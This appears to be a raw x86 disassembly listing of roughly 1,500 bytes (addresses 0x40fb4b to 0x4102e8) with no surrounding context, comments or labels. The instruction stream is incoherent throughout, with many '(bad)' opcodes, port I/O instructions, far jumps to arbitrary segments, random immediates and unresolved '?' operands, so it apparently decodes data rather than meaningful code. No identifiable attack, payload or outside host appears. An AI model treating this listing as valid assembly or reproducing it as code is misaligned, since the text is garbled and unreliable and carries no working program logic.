  40fb4b:	ins    BYTE PTR es:[edi],dx
  40fb4c:	sub    esi,DWORD PTR [edx+0x25b40d99]
  40fb52:	in     eax,0x55
  40fb54:	mov    ebx,0xf89a45af
  40fb59:	cvtpi2ps xmm2,QWORD PTR [ebp-0x49]
  40fb5d:	inc    ebx
  40fb5e:	bound  edi,QWORD PTR [eax+0x69]
  40fb61:	xor    edi,DWORD PTR ds:0x77ef68a4
  40fb67:	push   ds
  40fb68:	adc    dl,0x56
  40fb6b:	lahf   
  40fb6c:	fisubr WORD PTR [esi+0x4e]
  40fb6f:	jg     0x40faf3
  40fb71:	aaa    
  40fb72:	jno    0x40fb0a
  40fb74:	dec    BYTE PTR [edx+edx*8-0x15]
  40fb78:	call   0x93fb:0x97cc8a3d
  40fb7f:	jne    0x40fb68
  40fb81:	push   ebx
  40fb82:	mov    ds:0xacd6f4fc,al
  40fb87:	lock std 
  40fb89:	add    DWORD PTR [ecx-0x26],ebp
  40fb8c:	jns    0x40fb30
  40fb8e:	sub    eax,0x65b5878a
  40fb93:	sub    BYTE PTR [ebx-0x28],bl
  40fb96:	pop    ss
  40fb97:	mov    ecx,0x4b4626f7
  40fb9c:	mov    ah,0x4e
  40fb9e:	neg    dl
  40fba0:	das    
  40fba1:	xchg   edx,eax
  40fba2:	push   eax
  40fba3:	stos   DWORD PTR es:[edi],eax
  40fba4:	jns    0x40fbcc
  40fba6:	push   ebx
  40fba7:	mov    ds:0xd4a9b265,eax
  40fbac:	sbb    al,0xf
  40fbae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbaf:	daa    
  40fbb0:	jmp    0x40fb60
  40fbb2:	vpslld xmm7,xmm0,XMMWORD PTR [eax+0x5bc722cd]
  40fbba:	test   DWORD PTR [ecx],edi
  40fbbc:	and    DWORD PTR [edx-0x55ed9e7f],ebx
  40fbc2:	ins    DWORD PTR es:[edi],dx
  40fbc3:	stos   BYTE PTR es:[edi],al
  40fbc4:	push   esp
  40fbc5:	sti    
  40fbc6:	mov    ch,0x6d
  40fbc8:	mov    esp,0x3816665c
  40fbcd:	mov    ebx,DWORD PTR [ecx+0x2dafc4f2]
  40fbd3:	pusha  
  40fbd4:	push   edi
  40fbd5:	mov    ebp,0xc7fe6d73
  40fbda:	sbb    eax,DWORD PTR [esi-0x78]
  40fbdd:	fisttp WORD PTR [esi+0x51e0f8b4]
  40fbe3:	fldcw  WORD PTR ds:0x4e98322c
  40fbe9:	dec    ebp
  40fbea:	cmp    ax,WORD PTR [edi+edx*8]
  40fbee:	je     0x40fbdf
  40fbf0:	mov    al,BYTE PTR [edi]
  40fbf2:	scas   eax,DWORD PTR es:[edi]
  40fbf3:	out    0x65,eax
  40fbf5:	add    eax,0xb72d3215
  40fbfa:	xadd   DWORD PTR [esi+0x79],edx
  40fbfe:	frstor [ebp+ebp*1-0x16]
  40fc02:	pusha  
  40fc03:	xchg   ebp,eax
  40fc04:	fs pop edx
  40fc06:	adc    DWORD PTR [eax],0x2eca90fb
  40fc0c:	pop    ecx
  40fc0d:	inc    ebx
  40fc0e:	nop
  40fc0f:	out    0xb5,al
  40fc11:	xor    BYTE PTR [esi-0x25],0xab
  40fc15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc16:	jae    0x40fc0b
  40fc18:	out    0x69,al
  40fc1a:	cli    
  40fc1b:	push   ebp
  40fc1c:	pushf  
  40fc1d:	mov    ebp,0x634404e9
  40fc22:	test   eax,0x1f935d61
  40fc27:	dec    esp
  40fc28:	bound  esp,QWORD PTR [edx]
  40fc2a:	lods   al,BYTE PTR ds:[esi]
  40fc2b:	dec    edx
  40fc2c:	bound  edi,QWORD PTR [edx+0x4e0a1a69]
  40fc32:	(bad)  
  40fc33:	pop    ebx
  40fc34:	xchg   esi,eax
  40fc35:	add    al,0x61
  40fc38:	push   esp
  40fc39:	jbe    0x40fc5d
  40fc3b:	call   0xd47dc834
  40fc40:	sar    BYTE PTR [ebx],0xa3
  40fc43:	add    al,0x78
  40fc45:	fiadd  WORD PTR [eax]
  40fc47:	ficomp DWORD PTR [eax-0x58]
  40fc4a:	mov    dh,0xf2
  40fc4c:	add    BYTE PTR [edx+0x439f0167],cl
  40fc52:	mov    edi,0xbf3c872f
  40fc57:	fstp   TBYTE PTR [ebp+0x378e37cc]
  40fc5d:	dec    ebx
  40fc5e:	cwde   
  40fc5f:	pusha  
  40fc60:	fwait
  40fc61:	sbb    DWORD PTR [esi],ebp
  40fc63:	inc    edi
  40fc64:	repz push ecx
  40fc66:	(bad)  
  40fc67:	iret   
  40fc68:	push   eax
  40fc69:	add    esi,DWORD PTR [ecx+eax*4-0x4b]
  40fc6d:	pop    ss
  40fc6e:	jmp    0xe779:0x59b1b1b8
  40fc75:	stc    
  40fc76:	std    
  40fc77:	test   DWORD PTR [ebp+0x482c109],ebx
  40fc7d:	inc    ebp
  40fc7e:	sti    
  40fc7f:	dec    eax
  40fc80:	aad    0xc1
  40fc82:	sahf   
  40fc83:	dec    edx
  40fc84:	call   0xa0e4:0x8ff39556
  40fc8b:	das    
  40fc8c:	mov    eax,ds:0xbe88cbbb
  40fc91:	mov    DWORD PTR [edx+0x4f],ecx
  40fc94:	cmp    al,0xf8
  40fc96:	repnz push ecx
  40fc98:	in     al,dx
  40fc99:	lahf   
  40fc9a:	ror    BYTE PTR [edx-0x1],1
  40fc9d:	popf   
  40fc9e:	or     edx,DWORD PTR ds:0x13b1892e
  40fca4:	pop    eax
  40fca5:	int    0x14
  40fca7:	dec    eax
  40fca8:	cmc    
  40fca9:	sub    BYTE PTR [ebp-0x52c56724],bh
  40fcaf:	loop   0x40fcd9
  40fcb1:	or     DWORD PTR [edx+eiz*4-0x4f496eac],ecx
  40fcb8:	ins    BYTE PTR es:[edi],dx
  40fcb9:	cld    
  40fcba:	xor    ecx,ecx
  40fcbc:	repnz gs mov esi,0xff7b4f10
  40fcc3:	int3   
  40fcc4:	cmc    
  40fcc5:	xchg   ecx,eax
  40fcc6:	pop    eax
  40fcc7:	mov    BYTE PTR [edx],bl
  40fcc9:	inc    esi
  40fcca:	aaa    
  40fccb:	xor    dl,BYTE PTR [ecx+0x59]
  40fcce:	xchg   BYTE PTR [edx+esi*1-0x4a],bl
  40fcd2:	sub    al,0x7d
  40fcd4:	xchg   esp,eax
  40fcd5:	dec    ebp
  40fcd6:	dec    esp
  40fcd7:	aam    0x13
  40fcd9:	test   BYTE PTR [ebx+0x7f],ah
  40fcdc:	out    0x94,eax
  40fcde:	dec    al
  40fce0:	cwde   
  40fce1:	mov    ah,BYTE PTR [edx-0x451e05c7]
  40fce7:	mov    bh,0xfd
  40fce9:	sbb    edi,ebx
  40fceb:	fdivr  st(7),st
  40fced:	or     eax,0x1f309efb
  40fcf2:	mov    eax,0xa0afd24d
  40fcf7:	cs test al,0x30
  40fcfa:	sub    ch,BYTE PTR [ebx-0x5e]
  40fcfd:	faddp  st(7),st
  40fcff:	mov    dl,0x93
  40fd01:	aas    
  40fd02:	or     al,0xaf
  40fd04:	test   DWORD PTR [ecx-0x194dd044],0x36f796fa
  40fd0e:	xchg   ebp,eax
  40fd0f:	sub    ah,BYTE PTR [ebx]
  40fd11:	jmp    0x40fcac
  40fd13:	lods   eax,DWORD PTR ds:[esi]
  40fd14:	jl     0x40fcec
  40fd16:	adc    al,0x32
  40fd18:	or     eax,0x39ff9ca6
  40fd1d:	push   ecx
  40fd1e:	aam    0x8d
  40fd20:	adc    al,0x3b
  40fd22:	fucom  st(0)
  40fd24:	and    eax,0x7edebbe8
  40fd29:	lds    edx,FWORD PTR [ecx]
  40fd2b:	push   ecx
  40fd2c:	daa    
  40fd2d:	or     eax,0x37ac7f2
  40fd32:	push   edx
  40fd33:	push   ebp
  40fd34:	enter  0xc425,0xd2
  40fd38:	lea    esi,[eax]
  40fd3a:	jbe    0x40fccd
  40fd3c:	sub    bl,ah
  40fd3e:	sub    DWORD PTR [eax],ebx
  40fd40:	xor    eax,0xa09134dd
  40fd45:	mov    ch,BYTE PTR [ebp-0x3d]
  40fd48:	call   0x1d2eb6a2
  40fd4d:	or     BYTE PTR [edi-0x17],ch
  40fd50:	jmp    DWORD PTR [ebp-0x282d954d]
  40fd56:	das    
  40fd57:	push   edi
  40fd58:	sub    BYTE PTR [edx-0x7142f2a8],ah
  40fd5e:	aad    0xdd
  40fd60:	xor    dl,bh
  40fd62:	dec    ebp
  40fd63:	dec    esp
  40fd64:	imul   edi,DWORD PTR [esi],0xffffff93
  40fd67:	xor    al,0x76
  40fd69:	xchg   DWORD PTR [ebx+0x383e86e9],edi
  40fd6f:	cmp    DWORD PTR [ebp+0x6e],0xd
  40fd73:	(bad)  
  40fd74:	ins    DWORD PTR es:[edi],dx
  40fd75:	ins    DWORD PTR es:[edi],dx
  40fd76:	pop    edi
  40fd77:	xchg   esp,eax
  40fd78:	jne    0x40fdf5
  40fd7a:	jbe    0x40fdb8
  40fd7c:	stos   DWORD PTR es:[edi],eax
  40fd7d:	fnsave [edx]
  40fd7f:	sahf   
  40fd80:	jns    0x40fd98
  40fd82:	ret    
  40fd83:	adc    al,0x37
  40fd85:	(bad)  
  40fd86:	test   al,0x3b
  40fd88:	jns    0x40fde1
  40fd8a:	test   eax,0xaa7d1937
  40fd8f:	scas   al,BYTE PTR es:[edi]
  40fd90:	or     BYTE PTR [ebp-0x56],bl
  40fd93:	loope  0x40fd34
  40fd95:	fisubr DWORD PTR ss:[esi]
  40fd98:	stc    
  40fd99:	xor    bh,bl
  40fd9b:	fldenv [esi-0x47]
  40fd9e:	data16 arpl WORD PTR [ebp-0x1b],sp
  40fda2:	cmc    
  40fda3:	call   0x72b36363
  40fda8:	in     eax,0x34
  40fdaa:	mov    edi,fs
  40fdac:	lahf   
  40fdad:	ret    0x6451
  40fdb0:	add    eax,0x94e0b512
  40fdb5:	sbb    eax,0x6b3c80f8
  40fdba:	pop    eax
  40fdbb:	cmp    DWORD PTR [edx+0x34],eax
  40fdbe:	xchg   BYTE PTR [ebx+0x5a833de1],dh
  40fdc4:	(bad)  
  40fdc5:	fucomip st,st(7)
  40fdc7:	xor    DWORD PTR [eax+0x604c947],edx
  40fdcd:	cld    
  40fdce:	scas   eax,DWORD PTR es:[edi]
  40fdcf:	fsub   DWORD PTR [esi+0x3a]
  40fdd2:	sahf   
  40fdd3:	div    edi
  40fdd5:	lahf   
  40fdd6:	sahf   
  40fdd7:	adc    dh,BYTE PTR [ebx+0x45]
  40fdda:	mov    ch,0x41
  40fddc:	push   esi
  40fddd:	stos   DWORD PTR es:[edi],eax
  40fdde:	sbb    DWORD PTR [edi],ecx
  40fde0:	xchg   ecx,eax
  40fde1:	adc    eax,0x83f14bc2
  40fde6:	add    eax,0x2a0cbae3
  40fdeb:	dec    eax
  40fdec:	sbb    al,0x64
  40fdee:	mov    esp,0x8a45c43c
  40fdf3:	add    al,0x7a
  40fdf5:	je     0x40fe2c
  40fdf7:	(bad)  
  40fdf8:	ins    DWORD PTR es:[edi],dx
  40fdf9:	jno    0x40fdf8
  40fdfb:	sbb    dh,BYTE PTR [edx-0x1bf92aa9]
  40fe01:	xor    BYTE PTR [edi],dh
  40fe03:	dec    ebx
  40fe04:	imul   ebp,DWORD PTR ds:0xce962b5d,0x6b
  40fe0b:	dec    edx
  40fe0c:	lahf   
  40fe0d:	xchg   edi,eax
  40fe0e:	xchg   ecx,eax
  40fe0f:	sub    ebx,0xf88d81fa
  40fe15:	dec    esp
  40fe16:	pop    edx
  40fe17:	or     DWORD PTR [ecx],ebx
  40fe19:	(bad)  
  40fe1a:	mov    bh,0x4d
  40fe1c:	and    al,0x93
  40fe1e:	mov    dh,0x31
  40fe20:	sbb    BYTE PTR [ecx-0x1b],bl
  40fe23:	mov    ebp,0x820772be
  40fe28:	adc    DWORD PTR [edi-0x99bc878],ecx
  40fe2e:	std    
  40fe2f:	mov    ch,0x1c
  40fe31:	neg    BYTE PTR [edx+ecx*8+0x3fc645aa]
  40fe38:	cld    
  40fe39:	push   edx
  40fe3a:	dec    ebx
  40fe3b:	cld    
  40fe3c:	pop    ecx
  40fe3d:	adc    esi,DWORD PTR [eax-0x17ac84aa]
  40fe43:	push   ds
  40fe44:	cdq    
  40fe45:	pop    ebp
  40fe46:	or     al,0xe8
  40fe48:	mov    eax,0x420cc40c
  40fe4d:	xchg   edi,eax
  40fe4e:	cdq    
  40fe4f:	and    ah,BYTE PTR [esi]
  40fe51:	push   es
  40fe52:	push   edi
  40fe53:	adc    ch,BYTE PTR ds:0x60670322
  40fe59:	add    eax,0x5b950084
  40fe5e:	jmp    0x9800176b
  40fe63:	ins    BYTE PTR es:[edi],dx
  40fe64:	xchg   esp,eax
  40fe65:	mov    ebp,0xadef7e01
  40fe6a:	mov    WORD PTR gs:[ecx-0x6d],?
  40fe6e:	retf   
  40fe6f:	pop    esp
  40fe70:	fadd   QWORD PTR [ebx-0x3432ff5f]
  40fe76:	shr    DWORD PTR [esi],0x91
  40fe79:	jo     0x40fe45
  40fe7b:	pop    ss
  40fe7c:	dec    edx
  40fe7d:	int3   
  40fe7e:	inc    ebx
  40fe7f:	jge    0x40fe5e
  40fe81:	push   es
  40fe82:	pop    es
  40fe83:	js     0x40feb5
  40fe85:	(bad)  
  40fe86:	int    0x2
  40fe88:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40fe8a:	and    eax,0x9a483f78
  40fe8f:	mov    esp,0x7efceb92
  40fe94:	call   FWORD PTR [esi+edx*1]
  40fe97:	imul   ebx,DWORD PTR [eax-0x3c024237],0xe0f18c10
  40fea1:	ret    0xd473
  40fea4:	add    eax,0xd9f2ec97
  40fea9:	push   esi
  40feaa:	add    edx,DWORD PTR [edi-0x20574722]
  40feb0:	lock fcom QWORD PTR [edx+ebx*8+0x5d]
  40feb5:	mov    eax,DWORD PTR [ebx+0x49c295a5]
  40febb:	ins    DWORD PTR es:[edi],dx
  40febc:	test   al,0xbb
  40febe:	dec    edi
  40febf:	mov    eax,ds:0x31c6ab1d
  40fec4:	pop    edx
  40fec5:	jno    0x40fe8e
  40fec7:	push   0xfffffffc
  40fec9:	jns    0x40fe75
  40fecb:	or     eax,0xcfc50412
  40fed0:	mov    ch,0xbb
  40fed2:	cmp    ch,dh
  40fed4:	leave  
  40fed5:	(bad)  
  40fed6:	mov    bh,BYTE PTR [eax]
  40fed8:	jmp    0x40ff08
  40feda:	mov    ds:0x8c23e7d1,eax
  40fedf:	mov    esp,0xaae47d1d
  40fee4:	data16 (bad) 
  40fee6:	sbb    eax,esp
  40fee8:	push   es
  40fee9:	jge    0x40fe6b
  40feeb:	mov    al,0x57
  40feed:	dec    ecx
  40feee:	(bad)  
  40feef:	pop    ecx
  40fef0:	inc    eax
  40fef1:	into   
  40fef2:	or     BYTE PTR [ebp+ebx*8+0x4d64e050],dl
  40fef9:	pop    eax
  40fefa:	or     BYTE PTR [ebp+0x305255b5],ch
  40ff00:	fisubr WORD PTR [edi-0x498c9c39]
  40ff06:	jle    0x40ff2e
  40ff08:	push   ds
  40ff09:	out    dx,eax
  40ff0a:	out    dx,eax
  40ff0b:	jns    0x40feb6
  40ff0d:	sub    ecx,DWORD PTR [edi+0x50]
  40ff10:	push   0xffffffe4
  40ff12:	out    dx,al
  40ff13:	in     eax,dx
  40ff14:	stos   BYTE PTR es:[edi],al
  40ff15:	xor    eax,DWORD PTR [esi+0x3b]
  40ff18:	push   ecx
  40ff19:	int3   
  40ff1a:	retf   0x9d0c
  40ff1d:	scas   eax,DWORD PTR es:[edi]
  40ff1e:	loopne 0x40ff13
  40ff20:	in     al,dx
  40ff21:	push   es
  40ff22:	imul   ebx,DWORD PTR [si+0x2121],0x54bb5921
  40ff2b:	jge    0x40fec1
  40ff2d:	jbe    0x40feee
  40ff2f:	dec    ebp
  40ff30:	push   ds
  40ff31:	push   0x55
  40ff33:	int    0xa
  40ff35:	shl    BYTE PTR [edi],cl
  40ff37:	xchg   ecx,eax
  40ff38:	inc    esp
  40ff39:	and    DWORD PTR gs:[esi-0x9],edi
  40ff3d:	clc    
  40ff3e:	cmp    ecx,DWORD PTR [eax+eax*2+0x69544241]
  40ff45:	test   al,0xcb
  40ff47:	sbb    al,0xe7
  40ff49:	push   es
  40ff4a:	inc    ebp
  40ff4b:	nop
  40ff4c:	mov    al,ds:0xc1ec0d07
  40ff51:	and    al,0xa6
  40ff53:	or     BYTE PTR [esi+0x57],bl
  40ff56:	test   al,0x96
  40ff58:	in     al,dx
  40ff59:	xor    DWORD PTR [eax+0x6b2a0097],ebp
  40ff5f:	fistp  WORD PTR [eax+ebx*2+0x46f21d0a]
  40ff66:	dec    edx
  40ff67:	xor    edx,eax
  40ff69:	pushf  
  40ff6a:	push   esi
  40ff6b:	stc    
  40ff6c:	ss in  al,dx
  40ff6e:	arpl   WORD PTR [esi-0x6fd16321],si
  40ff74:	ret    0x938e
  40ff77:	and    BYTE PTR [edx+0x72014573],0xcf
  40ff7e:	push   ss
  40ff7f:	not    BYTE PTR [eax+edx*2+0x65d91cf9]
  40ff86:	cmp    eax,eax
  40ff88:	lods   al,BYTE PTR ds:[esi]
  40ff89:	cmp    eax,0x114b6710
  40ff8e:	xchg   ebx,eax
  40ff8f:	mul    BYTE PTR [ebx+0x4c726660]
  40ff95:	jp     0x40ff8a
  40ff97:	push   eax
  40ff98:	adc    DWORD PTR [eax],esp
  40ff9a:	ins    BYTE PTR es:[edi],dx
  40ff9b:	popf   
  40ff9c:	jno    0x40ff59
  40ff9e:	fsubr  QWORD PTR [ebp+0x6a059bd4]
  40ffa4:	push   edi
  40ffa5:	adc    al,0xad
  40ffa7:	aaa    
  40ffa8:	hlt    
  40ffa9:	dec    edx
  40ffaa:	retf   
  40ffab:	lds    edi,FWORD PTR [ecx+0x6ebd0495]
  40ffb1:	mov    esp,0xefde0413
  40ffb6:	xor    ch,dl
  40ffb8:	mov    eax,0x1d96063e
  40ffbd:	outs   dx,BYTE PTR ds:[esi]
  40ffbe:	lahf   
  40ffbf:	mov    edi,0x3bdce369
  40ffc4:	das    
  40ffc5:	mov    ebx,0x7b93602f
  40ffca:	xchg   edi,eax
  40ffcb:	jnp    0x40ff5d
  40ffcd:	adc    bl,BYTE PTR [ecx]
  40ffcf:	lock inc esp
  40ffd1:	fsubr  DWORD PTR [esi+0x669a6140]
  40ffd7:	xchg   esp,eax
  40ffd8:	sahf   
  40ffd9:	xchg   edi,eax
  40ffda:	mov    BYTE PTR [ecx-0x49],bh
  40ffdd:	fldcw  WORD PTR [esi]
  40ffdf:	fisttp QWORD PTR [ebx+0x19]
  40ffe2:	inc    esi
  40ffe3:	out    dx,eax
  40ffe4:	and    al,0x1e
  40ffe6:	adc    esp,edx
  40ffe8:	lods   al,BYTE PTR ds:[esi]
  40ffe9:	xor    DWORD PTR [ebp-0x53140a98],ebx
  40ffef:	lea    eax,[ebp-0x65b85df1]
  40fff5:	jp     0x410035
  40fff7:	push   cs
  40fff8:	arpl   sp,bx
  40fffa:	inc    ebx
  40fffb:	sub    BYTE PTR [ebp+0x33],al
  40fffe:	inc    edi
  40ffff:	push   ds
  410000:	ja     0x410046
  410002:	fdiv   DWORD PTR [ecx-0x30]
  410005:	xchg   ebp,eax
  410006:	cmp    BYTE PTR [ebx-0x16],bl
  410009:	cmp    eax,0x4bd65572
  41000e:	xor    ah,dl
  410010:	jmp    0xb1b8:0x421b8011
  410017:	mov    ds:0xefeb2d2c,al
  41001c:	cmp    al,0x7a
  41001e:	mov    dh,0x7f
  410020:	or     esp,DWORD PTR cs:[edi]
  410023:	pop    edi
  410024:	test   al,0x78
  410026:	sbb    bh,dl
  410028:	sub    edi,esi
  41002a:	mov    ecx,0xeb202863
  41002f:	loope  0x41005c
  410031:	sbb    al,0xb
  410033:	xor    ch,BYTE PTR [ebx-0x4b]
  410036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410037:	cld    
  410038:	shl    ah,0x9
  41003b:	js     0x4100a9
  41003d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41003e:	ret    0x4110
  410041:	pushf  
  410042:	out    dx,al
  410043:	add    BYTE PTR [esi-0x17],ah
  410046:	cmp    DWORD PTR [ebx+0x27461737],ebp
  41004c:	jno    0x410005
  41004e:	dec    edx
  41004f:	je     0x410094
  410051:	pop    ecx
  410052:	rcl    esp,0xff
  410055:	mov    ss,WORD PTR [edi-0x57]
  410058:	shl    DWORD PTR [ebx],1
  41005a:	lods   al,BYTE PTR ds:[esi]
  41005b:	sub    BYTE PTR [edx+0x56becc4d],0x6c
  410062:	into   
  410063:	pop    ss
  410064:	sub    edx,DWORD PTR [ecx-0x938d6d9]
  41006a:	xor    BYTE PTR [ecx+ebx*8+0x10801146],0x87
  410072:	sub    ebx,DWORD PTR [ebp+ecx*1-0x42]
  410076:	xchg   ebx,eax
  410077:	pop    esp
  410078:	fwait
  410079:	leave  
  41007a:	add    dl,al
  41007c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41007d:	loopne 0x410078
  41007f:	fistp  DWORD PTR ds:0x99124007
  410085:	aas    
  410086:	ficomp DWORD PTR [ecx+edi*1+0x2a7a3021]
  41008d:	push   eax
  41008e:	shl    DWORD PTR [esi],0x48
  410091:	adc    dh,BYTE PTR ss:[eax]
  410094:	add    bl,dh
  410096:	push   0x51e8cb50
  41009b:	stc    
  41009c:	mov    al,ds:0x22d1677a
  4100a1:	sub    DWORD PTR [edx+0x25e5c5fd],0xd4a154d5
  4100ab:	add    esi,esp
  4100ad:	jo     0x410084
  4100af:	add    ah,cl
  4100b1:	pop    ecx
  4100b2:	leave  
  4100b3:	push   edi
  4100b4:	xor    dl,BYTE PTR [edx+0x21]
  4100b7:	gs inc esp
  4100b9:	adc    al,0x23
  4100bb:	leave  
  4100bc:	add    BYTE PTR [ebp+eiz*8+0x227b7896],al
  4100c3:	jl     0x4100d9
  4100c5:	xor    BYTE PTR [ebp+0x35],dl
  4100c8:	xor    esi,DWORD PTR [esi-0x23]
  4100cb:	sub    ch,BYTE PTR [ebp-0x34caf074]
  4100d1:	call   0x155e:0x8d8b73bb
  4100d8:	and    dh,BYTE PTR [ebp-0x31]
  4100db:	cmp    bh,BYTE PTR [ecx+ecx*4+0x166c08fd]
  4100e2:	xor    ah,BYTE PTR [ebx]
  4100e4:	xor    eax,0xe78d6817
  4100e9:	loop   0x410159
  4100eb:	ret    
  4100ec:	jecxz  0x410128
  4100ee:	imul   ebp,esi,0x13
  4100f1:	push   esi
  4100f2:	test   edi,0xbfbab8c1
  4100f8:	adc    ah,BYTE PTR [eax+0x3d]
  4100fb:	clc    
  4100fc:	inc    esi
  4100fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100fe:	fisubr DWORD PTR [esi]
  410100:	test   DWORD PTR [ecx-0x32cd8976],0x9937d684
  41010a:	inc    BYTE PTR [esi+0x17d2a413]
  410110:	adc    eax,0x200a05bd
  410115:	retf   0x657a
  410118:	sbb    eax,0xe780adc8
  41011d:	add    eax,0xb8d79699
  410122:	adc    bl,BYTE PTR [ebx+0x14]
  410125:	or     eax,0xb8df4ccf
  41012a:	push   ebx
  41012b:	pop    ecx
  41012c:	mov    bl,0x96
  41012e:	in     al,dx
  41012f:	daa    
  410130:	fisttp DWORD PTR [edi-0x54abe372]
  410136:	test   al,bh
  410138:	mov    edx,0xc43acf51
  41013d:	test   dh,al
  41013f:	ret    
  410140:	inc    edi
  410141:	imul   eax,esi,0xffffffbd
  410144:	dec    edx
  410145:	js     0x410186
  410147:	mov    WORD PTR [ebx+eiz*2],ss
  41014a:	sar    DWORD PTR ds:0xf7621c1d,1
  410150:	inc    edx
  410151:	ret    0x2e8f
  410154:	fcomp  DWORD PTR [ebx]
  410156:	dec    eax
  410157:	sub    ah,BYTE PTR ss:[eax+ecx*2+0x8]
  41015c:	mov    dl,BYTE PTR fs:[edi-0x72]
  410160:	out    dx,al
  410161:	hlt    
  410162:	dec    esp
  410163:	shr    BYTE PTR [eax+0x7e22e4d7],1
  410169:	aad    0x3b
  41016b:	sahf   
  41016c:	adc    BYTE PTR [edx-0x12cd0d7f],dl
  410172:	and    eax,0xf3de0a28
  410177:	sahf   
  410178:	jg     0x4101c2
  41017a:	je     0x41017d
  41017c:	pop    esp
  41017d:	xor    al,0xf7
  41017f:	xchg   esp,eax
  410180:	aaa    
  410181:	adc    BYTE PTR [edx+0x3e0d3c90],bh
  410187:	mov    dl,0x3
  410189:	loop   0x4101fd
  41018b:	pop    ebp
  41018c:	pop    ebx
  41018d:	push   edx
  41018e:	cld    
  41018f:	in     al,0x4c
  410191:	call   0xa649:0xa888da81
  410198:	pop    ss
  410199:	jg     0x4101c7
  41019b:	add    al,0x7d
  41019d:	in     eax,dx
  41019e:	stc    
  41019f:	sub    DWORD PTR [eax-0x9],0x5de637e6
  4101a6:	add    eax,esp
  4101a8:	dec    ecx
  4101a9:	hlt    
  4101aa:	rcr    eax,cl
  4101ac:	xchg   edi,eax
  4101ad:	nop
  4101ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101af:	mov    edi,edi
  4101b1:	add    cl,al
  4101b3:	push   esi
  4101b4:	mov    edi,0xd103fe96
  4101b9:	retf   
  4101ba:	imul   edx,edx,0x2b69355e
  4101c0:	data16 sub BYTE PTR [ecx],dh
  4101c3:	stos   BYTE PTR es:[edi],al
  4101c4:	mov    eax,0x9eecb57d
  4101c9:	mov    ah,0xa0
  4101cb:	lock lods al,BYTE PTR ds:[esi]
  4101cd:	mov    eax,0x507b6be2
  4101d2:	jle    0x410212
  4101d4:	pop    ebx
  4101d5:	mov    ?,edx
  4101d7:	rcl    BYTE PTR [esp+eiz*4-0xe],1
  4101db:	pop    esp
  4101dc:	(bad)  
  4101dd:	call   0x8b379ff5
  4101e2:	jp     0x4101e4
  4101e4:	push   edx
  4101e5:	or     edi,esp
  4101e7:	sbb    esi,edx
  4101e9:	xchg   ecx,eax
  4101eb:	popf   
  4101ec:	pop    edx
  4101ed:	enter  0x5b7a,0x19
  4101f1:	dec    eax
  4101f2:	ds add ch,bl
  4101f5:	stc    
  4101f6:	jb     0x410244
  4101f8:	xor    BYTE PTR [edx+0xbc6ca74],bl
  4101fe:	mov    bh,0x59
  410200:	out    0x88,al
  410202:	xor    eax,edx
  410204:	(bad)  
  410205:	push   ds
  410206:	xor    DWORD PTR [edi-0x41],edx
  410209:	jne    0x4101d2
  41020b:	mov    dl,0x18
  41020d:	mov    ebx,0xecaf567c
  410212:	out    0xf4,al
  410214:	test   BYTE PTR [ebp-0x6a],dh
  410217:	dec    edi
  410218:	test   eax,0x3dc26b3d
  41021d:	(bad)
  410221:	cli    
  410222:	aaa    
  410223:	(bad)  
  410224:	jmp    0x4b51261
  410229:	mov    BYTE PTR [eax+0x13403e62],bh
  41022f:	jbe    0x410249
  410231:	pop    ds
  410232:	xor    eax,0xe4db33c5
  410237:	push   ecx
  410238:	call   FWORD PTR [ebp-0xb]
  41023b:	les    esi,FWORD PTR ss:[ebx-0x78]
  41023f:	out    0xc8,eax
  410241:	(bad)  
  410242:	mov    DWORD PTR [edi],edx
  410244:	ror    DWORD PTR [ebp+0x46],1
  410247:	pop    esi
  410248:	push   edx
  410249:	(bad)  
  41024a:	push   cs
  41024b:	stc    
  41024c:	stos   BYTE PTR es:[edi],al
  41024d:	jmp    0x410206
  41024f:	ins    BYTE PTR es:[edi],dx
  410250:	mov    dl,0xa1
  410252:	push   esi
  410253:	enter  0xaaf2,0xa7
  410257:	sbb    ecx,DWORD PTR [esi-0x55e80fbe]
  41025d:	xor    DWORD PTR ds:0xe4a6f6b,ebp
  410263:	add    al,0xc0
  410265:	add    al,0x72
  410267:	adc    DWORD PTR [edx+0x3c86fd81],esi
  41026d:	push   edx
  41026e:	jmp    0x29693230
  410273:	adc    esp,ebx
  410275:	loop   0x4102dc
  410277:	fstp   DWORD PTR [edx]
  410279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41027a:	in     al,0x14
  41027c:	fcom   QWORD PTR [edi-0x67]
  41027f:	call   0x9455:0x3c1f54a
  410286:	xchg   ebp,eax
  410287:	jne    0x4102b4
  410289:	jmp    0x410307
  41028b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41028c:	retf   
  41028d:	mov    dh,0x18
  41028f:	xchg   ecx,eax
  410290:	sub    eax,0xd75bda5a
  410295:	rol    BYTE PTR [ebp+0x5b],1
  410298:	stos   BYTE PTR es:[edi],al
  410299:	lods   eax,DWORD PTR ds:[esi]
  41029a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41029b:	fsubr  QWORD PTR [edx]
  41029d:	cmc    
  41029e:	sub    al,0x43
  4102a1:	shr    BYTE PTR [edx+ebp*8],1
  4102a4:	fnstcw WORD PTR [ebx-0x7db98c8a]
  4102aa:	sub    edi,esi
  4102ac:	imul   esi,DWORD PTR [eax+eax*8-0x452d2091],0x3b14567d
  4102b7:	xor    al,0x8b
  4102b9:	idiv   DWORD PTR [ebx+0x62]
  4102bc:	inc    esp
  4102bd:	aaa    
  4102be:	fistp  WORD PTR [edx-0x55a7c781]
  4102c4:	dec    esp
  4102c5:	cmp    DWORD PTR [ebp-0x148f44b0],esi
  4102cb:	mov    ch,BYTE PTR [ecx-0x27]
  4102ce:	pop    ss
  4102cf:	bound  edi,QWORD PTR [ebx+ecx*4+0x19]
  4102d3:	ins    BYTE PTR es:[edi],dx
  4102d4:	cmp    ebp,DWORD PTR [ebp+0x29]
  4102d7:	loop   0x4102fe
  4102d9:	clc    
  4102da:	std    
  4102db:	jmp    FWORD PTR [eax+0x1a244032]
  4102e1:	mov    ebp,0x59f0dabc
  4102e6:	ja     0x41030c
  4102e8:	push   edi
